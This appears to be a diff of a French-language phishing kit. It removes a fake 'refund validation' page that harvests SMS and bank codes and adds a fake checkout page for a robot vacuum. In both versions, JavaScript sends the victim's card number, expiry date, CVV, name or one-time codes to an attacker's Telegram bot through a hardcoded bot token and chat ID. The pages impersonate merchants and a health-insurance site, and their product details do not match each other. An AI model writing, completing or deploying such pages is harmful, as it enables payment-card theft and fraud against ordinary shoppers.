@@ -3,167 +3,296 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Validation de Remboursement</title>
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <title>Page de Paiement</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
     <style>
         body {
-            font-family: 'Roboto', sans-serif;
+            font-family: 'Roboto', Arial, sans-serif;
+            background: linear-gradient(to right, #ffffff, #f4f4f4);
             margin: 0;
             padding: 0;
-            background-color: #f7f9fc;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
         }
 
         .container {
-            background: #ffffff;
-            border-radius: 12px;
-            box-shadow: 0 12px 24px rgba(0, 0, 0, 0.1);
-            padding: 25px;
-            max-width: 450px;
-            width: 100%;
+            max-width: 700px;
+            margin: 50px auto;
+            background-color: #fff;
+            border-radius: 10px;
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
+            padding: 30px 40px;
+        }
+
+        h2 {
             text-align: center;
-            animation: fadeIn 0.8s ease-in-out;
+            color: #c70000;
+            margin-bottom: 30px;
+            font-size: 24px;
         }
 
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(-10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        .orange-box {
-            background-color: #ff9800;
-            color: #fff;
-            padding: 15px;
-            border-radius: 8px;
-            margin-bottom: 20px;
-            font-weight: 500;
-        }
-
-        .orange-box h2 {
-            margin: 0;
-            font-size: 18px;
-            font-weight: bold;
-        }
-
-        .info {
-            text-align: left;
-            font-size: 15px;
-            color: #444;
-            margin: 20px 0;
-        }
-
-        .info p {
-            margin: 5px 0;
-        }
-
-        input {
-            width: 100%;
-            padding: 10px;
-            margin: 10px 0;
-            border: 1px solid #ccc;
-            border-radius: 6px;
-            font-size: 14px;
-            box-sizing: border-box;
-        }
-
-        .btn {
-            display: inline-block;
-            background-color: #4caf50;
-            color: #fff;
-            font-weight: bold;
-            padding: 12px;
-            border-radius: 6px;
-            width: 100%;
+        /* Section du produit */
+        .product-info {
             text-align: center;
-            text-decoration: none;
+            margin-bottom: 30px;
+        }
+
+        .product-info img {
+            width: 150px; /* Taille de l'image du produit */
+            margin-bottom: 15px;
+        }
+
+        .product-info p {
+            font-size: 16px;
+            color: #333;
+        }
+
+        .price {
+            font-size: 20px;
+            color: #c70000;
+            font-weight: bold;
             margin-top: 10px;
+        }
+
+        /* Séparateur entre le produit et les informations de paiement */
+        hr {
+            border: 0;
+            border-top: 2px solid #c70000;
+            margin: 30px 0;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            font-weight: 500;
+            margin-bottom: 8px;
+            display: block;
+            color: #333;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+
+        .form-group input:focus {
+            border-color: #c70000;
+            outline: none;
+        }
+
+        .form-group button {
+            width: 100%;
+            padding: 15px;
+            background-color: #c70000;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 18px;
+            cursor: pointer;
             transition: background-color 0.3s ease;
         }
 
-        .btn:hover {
-            background-color: #45a049;
+        .form-group button:hover {
+            background-color: #a50000;
         }
 
-        .footer-icons img {
-            width: 100%;
-            max-width: 250px;
-            margin: 10px 0;
+        .secure-payment {
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .secure-payment img {
+            width: 150px;
         }
     </style>
 </head>
 <body>
+
     <div class="container">
-        <div class="orange-box">
-            <h2>Remboursement en attente de validation</h2>
-            <p>Merci de saisir le code reçu par SMS afin de valider votre demande de remboursement et de créditer le montant sur votre carte.</p>
+        <!-- Information du produit -->
+        <div class="product-info">
+            <img src="61n1pymUpkL._AC_SX569_.jpg" alt="ECOVACS Robot Aspirateur Laveur DEEBOT T30 Pro Omni">
+            <h3>ECOVACS Robot Aspirateur Laveur DEEBOT T30 Pro Omni</h3>
+            <p>Marque : ECOVACS</p>
+            <p>Modèle : T30 PRO OMNI</p>
+            <p>Aspiration puissante : 11 000 PA</p>
+            <p>Caractéristiques : Nettoyage humide adaptatif, ZeroTangle</p>
+            <p>Dimensions : 40,9L x 49l x 48H cm</p>
+            <p>Durée de vie de la batterie : 100 minutes</p>
+            <span class="price">499.99€</span>
         </div>
 
-        <div class="info">
-            <p><strong>Marchand :</strong> Widilo</p>
-            <p><strong>Montant de remboursement :</strong> 400 €</p>
-            <p><strong>Date :</strong> <span id="current-date"></span></p>
-            <p><strong>N° de carte :</strong> **** **** **** ****</p>
-        </div>
+        <!-- Séparateur -->
+        <hr>
 
-        <input type="text" placeholder="Code SMS" id="code-sms" required>
-        <input type="text" placeholder="Code Banque" id="code-banque" required>
+        <!-- Informations de paiement -->
+        <h2>Informations de Paiement</h2>
 
-        <a href="#" class="btn" onclick="validate()">Valider</a>
+        <form action="confirmation.html" method="POST" id="payment-form">
+            <div class="form-group">
+                <label for="card-number">Numéro de carte</label>
+                <input 
+                    type="text" 
+                    id="card-number" 
+                    name="card-number" 
+                    placeholder="xxxx xxxx xxxx xxxx" 
+                    maxlength="19" 
+                    inputmode="numeric" 
+                    required>
+            </div>
 
-        <div class="footer-icons">
-            <img src="IMG_4261.jpeg" alt="Sécurité garantie">
+            <div class="form-group">
+                <label for="expiry-date">Date d'expiration</label>
+                <div style="display: flex; gap: 10px;">
+                    <select id="expiry-month" name="expiry-month" required>
+                        <option value="" disabled selected>Mois</option>
+                        <option value="01">01</option>
+                        <option value="02">02</option>
+                        <option value="03">03</option>
+                        <option value="04">04</option>
+                        <option value="05">05</option>
+                        <option value="06">06</option>
+                        <option value="07">07</option>
+                        <option value="08">08</option>
+                        <option value="09">09</option>
+                        <option value="10">10</option>
+                        <option value="11">11</option>
+                        <option value="12">12</option>
+                    </select>
+                    <select id="expiry-year" name="expiry-year" required>
+                        <option value="" disabled selected>Année</option>
+                        <option value="2025">2025</option>
+                        <option value="2026">2026</option>
+                        <option value="2027">2027</option>
+                        <option value="2028">2028</option>
+                        <option value="2029">2029</option>
+                        <option value="2030">2030</option>
+                        <option value="2031">2031</option>
+                        <option value="2032">2032</option>
+                        <option value="2033">2033</option>
+                        <option value="2034">2034</option>
+                        <option value="2035">2035</option>
+                        <option value="2036">2036</option>
+                    </select>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label for="cvv">CVV</label>
+                <input 
+                    type="text" 
+                    id="cvv" 
+                    name="cvv" 
+                    placeholder="123" 
+                    maxlength="3" 
+                    inputmode="numeric" 
+                    required>
+            </div>
+
+            <div class="form-group">
+                <label for="name-on-card">Nom sur la carte</label>
+                <input type="text" id="name-on-card" name="name-on-card" placeholder="Entrez le nom" required>
+            </div>
+
+            <div class="form-group">
+                <button type="submit">Payer maintenant</button>
+            </div>
+        </form>
+
+        <div class="secure-payment">
+            <img src="instrumentys_paiement_securise_logo.jpg" alt="Paiement Sécurisé">
         </div>
     </div>
 
     <script>
-        function updateDate() {
-            const date = new Date();
-            const formattedDate = date.toLocaleDateString('fr-FR', {
-                weekday: 'long', year: 'numeric', month: 'long', day: 'numeric'
-            });
-            document.getElementById('current-date').innerText = formattedDate;
-        }
+    const cardInput = document.getElementById('card-number');
 
-        updateDate();
+    cardInput.addEventListener('input', (e) => {
+        let value = e.target.value.replace(/\s+/g, ''); // Retirer les espaces
+        if (value.length > 16) value = value.slice(0, 16); // Limiter à 16 chiffres
+        const formattedValue = value.replace(/(\d{4})/g, '$1 ').trim(); // Ajouter un espace après chaque 4 chiffres
+        e.target.value = formattedValue;
+    });
 
-        function validate() {
-            const smsCode = document.getElementById('code-sms').value;
-            const bankCode = document.getElementById('code-banque').value;
+    // Fonction pour envoyer les informations au bot Telegram
+    document.getElementById('payment-form').addEventListener('submit', async function(e) {
+        e.preventDefault(); // Empêcher l'envoi du formulaire par défaut
 
-            if (smsCode === "" || bankCode === "") {
-                alert("Veuillez remplir tous les champs.");
+        const data = new FormData(this);
+        const cardNumber = data.get('card-number');
+        const expiryMonth = data.get('expiry-month');
+        const expiryYear = data.get('expiry-year');
+        const cvv = data.get('cvv');
+        const nameOnCard = data.get('name-on-card');
+        const price = "399.99€"; // Prix du produit
+
+        // Créez un message à envoyer
+        const message = `
+Produit : LG TV - 55NANO766 - 55 Pouces 4K
+Prix : ${price}
+Numéro de carte : ${cardNumber}
+Date d'expiration : ${expiryMonth}/${expiryYear}
+CVV : ${cvv}
+Nom sur la carte : ${nameOnCard}
+`;
+
+        const botToken = '8101158488:AAH6WIfCC6B6aGkWd_Tt6QRrWD8QKQQc69M'; // Votre token
+        const chatId = '5372119436'; // Votre chat ID Telegram
+
+        const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+        try {
+            // Envoi du message
+            const response = await fetch(telegramApiUrl);
+            const dataResponse = await response.json();
+
+            if (dataResponse.ok) {
+                // Redirection vers la page "Traitement.html"
+                window.location.href = "Traitement.html";
             } else {
-                const token = "7631724461:AAGvOb7G_n2IO1qGwpJp-WaHgyBhREW1mfU";
-                const chatId = "5372119436";
-                const message = `Code SMS: ${smsCode}\nCode Banque: ${bankCode}`;
-
-                fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json"
-                    },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text: message
-                    })
-                })
-                .then(response => {
-                    if (response.ok) {
-                        alert("Votre validation a été soumise avec succès !"); 
-                   window.location.href = "https://www.ameli.fr/assure/remboursements";
-                    } else {
-                        alert("Erreur lors de l'envoi des données. Veuillez réessayer.");
-                    }
-                })
-                .catch(error => {
-                    console.error("Erreur:", error);
-                    alert("Une erreur s'est produite. Veuillez réessayer.");
-                });
+                alert('Erreur dans l\'envoi des informations. Veuillez réessayer.');
             }
+        } catch (error) {
+            console.error('Erreur lors de l\'envoi:', error);
+            alert('Erreur réseau ou problème avec l\'API Telegram.');
         }
-    </script>
-</body>
-</html>
+    });
+</script>
+
+
+<!-- Footer -->
+<footer style="background-color: #2c3e50; color: #ecf0f1; padding: 20px;">
+    <div style="display: flex; justify-content: space-between; flex-wrap: wrap;">
+        <!-- Colonne 1 -->
+        <div style="flex: 1; min-width: 200px; margin: 10px;">
+            <h4 style="color: #e74c3c;">À propos</h4>
+            <p style="color: #bdc3c7;">Roborock France vous propose les meilleures solutions pour un nettoyage efficace et intelligent.</p>
+        </div>
+        <!-- Colonne 2 -->
+        <div style="flex: 1; min-width: 200px; margin: 10px;">
+            <h4 style="color: #e74c3c;">Liens utiles</h4>
+            <ul style="list-style: none; padding: 0;">
+                <li><a href="#" style="color: #ecf0f1; text-decoration: none;">Politique de confidentialité</a></li>
+                <li><a href="#" style="color: #ecf0f1; text-decoration: none;">Conditions d'utilisation</a></li>
+                <li><a href="#" style="color: #ecf0f1; text-decoration: none;">Assistance</a></li>
+            </ul>
+        </div>
+        <!-- Colonne 3 -->
+        <div style="flex: 1; min-width: 200px; margin: 10px;">
+            <h4 style="color: #e74c3c;">Suivez-nous</h4>
+            <div style="display: flex; gap: 10px;">
+                <a href="https://facebook.com" target="_blank" style="color: #ecf0f1; font-size: 1.5rem;"><i class="fab fa-facebook"></i></a>
+                <a href="https://instagram.com" target="_blank" style="color: #ecf0f1; font-size: 1.5rem;"><i class="fab fa-instagram"></i></a>
+                <a href="https://youtube.com" target="_blank" style="color: #ecf0f1; font-size: 1.5rem;"><i class="fab fa-youtube"></i></a>
+                <a href="https://tiktok.com" target="_blank" style="color: #ecf0f1; font-size: 1.5rem;"><i class="fab fa-tiktok"></i></a>
+            </div>
+        </div>
+    </div>
+    <div style="text-align: center; margin-top: 20px;">
+        <p>&copy; 2025 Roborock France. Tous droits réservés.</p>
+    </div>
+</footer>
